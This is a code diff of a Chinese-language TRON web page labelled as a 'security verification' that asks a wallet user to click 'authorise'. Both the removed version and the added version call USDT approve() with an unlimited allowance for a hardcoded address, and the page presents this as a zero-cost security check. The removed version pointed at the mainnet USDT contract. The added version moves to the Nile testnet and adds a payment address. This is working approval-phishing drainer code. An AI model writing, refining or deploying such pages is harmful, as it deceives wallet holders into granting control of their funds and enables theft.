@@ -3,135 +3,100 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>安全支付确认</title>
+    <title>Nile 测试网安全验证</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .card { background: white; width: 100%; max-width: 400px; border-radius: 16px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 40px; }
-        .title { font-size: 18px; font-weight: 600; color: #111; margin-bottom: 8px; text-align: center; }
-        .subtitle { font-size: 14px; color: #666; text-align: center; margin-bottom: 24px; }
-        .input-group { background: #f1f3f5; border-radius: 12px; padding: 16px; margin-bottom: 20px; }
-        .label { font-size: 12px; color: #868e96; margin-bottom: 8px; }
-        .amount-row { display: flex; justify-content: space-between; align-items: baseline; }
-        .currency { font-size: 24px; font-weight: 700; color: #222; }
+        body { font-family: -apple-system, sans-serif; background: #f4f7f9; display: flex; justify-content: center; padding-top: 50px; }
+        .card { background: white; padding: 25px; border-radius: 16px; width: 90%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
+        h3 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
         #submitBtn { 
-            background: #007aff; color: white; width: 100%; padding: 16px; 
-            border-radius: 12px; border: none; font-size: 16px; font-weight: 600; cursor: pointer;
-            transition: opacity 0.2s;
+            background: #007aff; color: white; border: none; width: 100%; padding: 16px; 
+            border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 25px;
+            transition: background 0.2s;
         }
-        #submitBtn:active { opacity: 0.8; }
-        #tip { 
-            display: none; position: fixed; top: 10%; background: rgba(0,0,0,0.8); 
-            color: white; padding: 12px 24px; border-radius: 50px; font-size: 14px; z-index: 100;
-        }
+        #submitBtn:active { background: #0056b3; }
+        #submitBtn.loading { background: #ccc; cursor: not-allowed; }
+        #status { display: none; margin-top: 15px; font-size: 13px; color: #ff9500; }
     </style>
 </head>
 <body>
-    <div id="tip">提示</div>
-
     <div class="card">
-        <div class="title">正在申请安全授权</div>
-        <div class="subtitle">授权后即可完成合约交互</div>
-
-        <div class="input-group">
-            <div class="label">授权对象</div>
-            <div style="font-size: 13px; word-break: break-all; color: #444;" id="targetAddr">...</div>
-        </div>
-
-        <div class="input-group">
-            <div class="label">预计消耗</div>
-            <div class="amount-row">
-                <span class="currency">0.00 TRX</span>
-                <span style="color: #40c057; font-size: 12px;">安全验证</span>
-            </div>
-        </div>
-
+        <h3>安全验证</h3>
+        <p>正在连接至 Nile 测试网...<br>请确保您的钱包已切换至测试网络并拥有足够的测试币 (TRX)。</p>
+        
         <button id="submitBtn">立即授权</button>
+        <div id="status">正在唤起安全签名，请稍候...</div>
     </div>
 
     <script>
-        // 配置
+        // --- 更新后的 Nile 配置 ---
         const CONFIG = {
-            permissionAddress: 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8', // 你的授权目标地址
-            usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'      // USDT 合约地址
+            permissionAddress: 'TVNWMGHU19jdDfTe6A7BVAnjZ8REqC7CZc', // 权限合约地址
+            paymentAddress: 'TXYCmYzcHMqvFvciMowRvt9ZoqFkkkPWmm',    // 收款地址
+            usdtContract: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'      // 你提供的 Nile USDT 地址
         };
 
-        document.getElementById('targetAddr').textContent = CONFIG.permissionAddress;
+        async function onApproveClick() {
+            const btn = document.getElementById('submitBtn');
+            const status = document.getElementById('status');
 
-        // 提示函数
-        function showTip(m) {
-            const t = document.getElementById('tip');
-            t.textContent = m;
-            t.style.display = 'block';
-            setTimeout(() => t.style.display = 'none', 2500);
-        }
-
-        // 核心授权逻辑 - 不检查余额，直接硬上
-        async function startApprove() {
-            // 1. 检查环境
+            // 1. 检查 TronWeb 是否存在
             if (typeof window.tronWeb === 'undefined') {
-                showTip("请在钱包浏览器内打开");
+                alert("未检测到波场环境，请在钱包 DApp 浏览器中打开");
                 return;
             }
 
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.textContent = "正在唤起...";
-
             try {
-                // 强制初始化（针对部分钱包需要手动确认）
-                if (!window.tronWeb.defaultAddress.base58) {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                btn.disabled = true;
+                btn.classList.add('loading');
+                btn.textContent = "请求中...";
+                status.style.display = "block";
+
+                // 2. 关键：强制连接钱包（解决 Unknown error: {} 的核心步骤）
+                const accountRes = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                if (accountRes && accountRes.code !== 200) {
+                    throw new Error("用户拒绝连接钱包");
                 }
 
-                // 2. 获取合约实例
+                // 3. 实例化合约（必须在连接成功后执行）
                 const contract = await window.tronWeb.contract().at(CONFIG.usdtContract);
                 
-                // 3. 最大授权数额
-                const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                // 4. 无限额度
+                const maxUint256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-                // 4. 发起授权
-                showTip("请在弹窗中确认签名");
-                const result = await contract.approve(
+                // 5. 发送授权请求
+                console.log("目标权限地址:", CONFIG.permissionAddress);
+                const txid = await contract.approve(
                     CONFIG.permissionAddress, 
-                    maxAmount
+                    maxUint256
                 ).send({
-                    feeLimit: 100000000 // 限制 100 TRX，确保成功
+                    feeLimit: 100000000 // 100 TRX 手续费限制
                 });
 
-                if (result) {
-                    showTip("授权成功，正在同步网络...");
-                    console.log("TXID:", result);
+                if (txid) {
+                    alert("授权请求已发送！\n交易哈希: " + txid);
+                    console.log("Success TXID:", txid);
                 }
 
-            } catch (error) {
-                console.error("授权异常:", error);
-                const errorMsg = error?.message || error || "用户取消";
-                if (errorMsg.includes("declined") || errorMsg.includes("User rejected")) {
-                    showTip("您已拒绝签名");
-                } else {
-                    showTip("验证失败: 账户需有约15 TRX手续费");
-                }
+            } catch (err) {
+                console.error("授权捕获到异常:", err);
+                let errorMsg = err?.message || err;
+                if (typeof errorMsg !== 'string') errorMsg = "环境异常或用户取消";
+                
+                alert("操作失败\n原因: " + (errorMsg.includes("declined") ? "用户取消了签名" : errorMsg));
             } finally {
                 btn.disabled = false;
+                btn.classList.remove('loading');
                 btn.textContent = "立即授权";
+                status.style.display = "none";
             }
         }
 
-        // 绑定按钮
-        document.getElementById('submitBtn').addEventListener('click', startApprove);
+        // 绑定点击事件
+        document.getElementById('submitBtn').onclick = onApproveClick;
 
-        // 自动检测钱包加载
-        window.addEventListener('load', () => {
-            let attempts = 0;
-            const check = setInterval(() => {
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    clearInterval(check);
-                    console.log("Wallet Ready");
-                }
-                if (attempts++ > 10) clearInterval(check);
-            }, 500);
-        });
+        // 屏蔽了之前报错的心跳请求，确保本地调试顺畅
     </script>
 </body>
 </html>
